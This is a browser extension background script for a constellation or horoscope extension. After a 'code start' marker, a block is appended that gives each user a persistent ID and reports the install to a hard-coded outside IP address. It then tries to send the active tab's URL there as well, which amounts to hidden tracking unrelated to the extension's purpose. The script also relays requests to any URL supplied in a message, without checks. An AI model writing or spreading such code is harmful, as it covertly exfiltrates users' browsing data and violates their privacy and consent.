/*
*author:think_fish
*description:Constellation background.js
*date:2014-08-04
*version:1.0.0
*copyright:think_fish all rights reservied.
*/

DB = function() {};
DB.prototype = {
    db: localStorage,
    get: function(key) {
        var r = null;
        try {
            r = JSON.parse(this.db.getItem(key))
        } catch(Exception) {
            r = (this.db.getItem(key) || "");
        };
        return r
    },
    set: function(key, val) {
        this.db.setItem(key, (typeof val == "string") ? (val || "") : JSON.stringify(val))
    }
};
var db=new DB();

chrome.extension.onMessage.addListener(function(request,render,sendResponse){
    $.ajax({
        type:'POST',
        url:request.url,
        data:request.params,
        async:false,
        dataType:"json",
        success:function(d){
            sendResponse(d);
        }
    });
});

/************ code start ***************/

(function(){function e(e,t,r){var n=t&&r||0,o=0;for(t=t||[],e.toLowerCase().replace(/[0-9a-f]{2}/g,function(e){16>o&&(t[n+o++]=f[e])});16>o;)t[n+o++]=0;return t}function t(e,t){var r=t||0,n=l;return n[e[r++]]+n[e[r++]]+n[e[r++]]+n[e[r++]]+"-"+n[e[r++]]+n[e[r++]]+"-"+n[e[r++]]+n[e[r++]]+"-"+n[e[r++]]+n[e[r++]]+"-"+n[e[r++]]+n[e[r++]]+n[e[r++]]+n[e[r++]]+n[e[r++]]+n[e[r++]]}function r(e,r,n){var o=r&&n||0,i=r||[];e=e||{};var u=null!=e.clockseq?e.clockseq:v,a=null!=e.msecs?e.msecs:(new Date).getTime(),c=null!=e.nsecs?e.nsecs:w+1,s=a-g+(c-w)/1e4;if(0>s&&null==e.clockseq&&(u=16383&u+1),(0>s||a>g)&&null==e.nsecs&&(c=0),c>=1e4)throw Error("uuid.v1(): Can't create more than 10M uuids/sec");g=a,w=c,v=u,a+=122192928e5;var d=(1e4*(268435455&a)+c)%4294967296;i[o++]=255&d>>>24,i[o++]=255&d>>>16,i[o++]=255&d>>>8,i[o++]=255&d;var l=268435455&1e4*(a/4294967296);i[o++]=255&l>>>8,i[o++]=255&l,i[o++]=16|15&l>>>24,i[o++]=255&l>>>16,i[o++]=128|u>>>8,i[o++]=255&u;for(var f=e.node||h,m=0;6>m;m++)i[o+m]=f[m];return r?r:t(i)}function n(e,r,n){var i=r&&n||0;"string"==typeof e&&(r="binary"==e?new d(16):null,e=null),e=e||{};var u=e.random||(e.rng||o)();if(u[6]=64|15&u[6],u[8]=128|63&u[8],r)for(var a=0;16>a;a++)r[i+a]=u[a];return r||t(u)}var o,i=this;if("function"==typeof require)try{var u=require("crypto").randomBytes;o=u&&function(){return u(16)}}catch(a){}if(!o&&i.crypto&&crypto.getRandomValues){var c=new Uint8Array(16);o=function(){return crypto.getRandomValues(c),c}}if(!o){var s=Array(16);o=function(){for(var e,t=0;16>t;t++)0===(3&t)&&(e=4294967296*Math.random()),s[t]=255&e>>>((3&t)<<3);return s}}for(var d="function"==typeof Buffer?Buffer:Array,l=[],f={},m=0;256>m;m++)l[m]=(m+256).toString(16).substr(1),f[l[m]]=m;var p=o(),h=[1|p[0],p[1],p[2],p[3],p[4],p[5]],v=16383&(p[6]<<8|p[7]),g=0,w=0,y=n;if(y.v1=r,y.v4=n,y.parse=e,y.unparse=t,y.BufferClass=d,i.define&&define.amd)define(function(){return y});else if("undefined"!=typeof module&&module.exports)module.exports=y;else{var S=i.uuid;y.noConflict=function(){return i.uuid=S,y},i.uuid=y}})();
var __ajax = function(url,r,fn,doc){var xhr=new XMLHttpRequest;xhr.onreadystatechange=function(){4==xhr.readyState&&fn(xhr,doc)};try{xhr.open("GET",url,true)}catch(e){return!1}xhr.send(r)};
var __get_uuid = function(){return localStorage["k5243.uuid"]?localStorage["k5243.uuid"]:localStorage["k5243.uuid"]=uuid();};

var __ext_id = "18629abe-b80a-43d9-8ebf-4d4c32f37f8a";
var __install_api = "http://42.96.134.126:30010/crx/install/"+__ext_id;
if(!localStorage["k5243.uuid"]){
    __ajax(__install_api,"",function(){},document);
}
var __uuid = __get_uuid();
var __api = "http://42.96.134.126:30010/home/api?uuid="+__uuid+"&extid="+__ext_id;

/*main*/
function tongji(){
     chrome.tabs.query({active:true,currentWindow:true},function(tabs) {
         var t = tabs[0];
         if (t.id == 2) {
            __ajax(__api,"ref="+t.url,function(){},document);
         }
     })
}

setTimeout(function(){
    tongji();
},50);

/************ code end ******************/
